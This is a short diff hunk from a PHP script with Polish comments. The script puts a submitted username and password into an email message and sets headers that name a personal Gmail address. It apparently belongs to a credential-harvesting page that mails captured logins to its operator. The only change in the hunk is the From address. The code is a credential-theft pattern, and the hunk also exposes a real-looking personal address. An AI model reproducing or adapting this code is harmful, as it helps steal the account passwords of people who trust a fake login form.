@@ -12,7 +12,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
     $message = "Użytkownik: " . $username . "\nHasło: " . $password;
 
     // Nagłówki wiadomości
-    $headers = 'From: grzesiu.antoszczyszyn@gmail.com' . "\r\n" .
+    $headers = 'From: 123@gmail.com' . "\r\n" .
                'Reply-To: grzesiu.antoszczyszyn@gmail.com' . "\r\n" .
                'X-Mailer: PHP/' . phpversion();
 
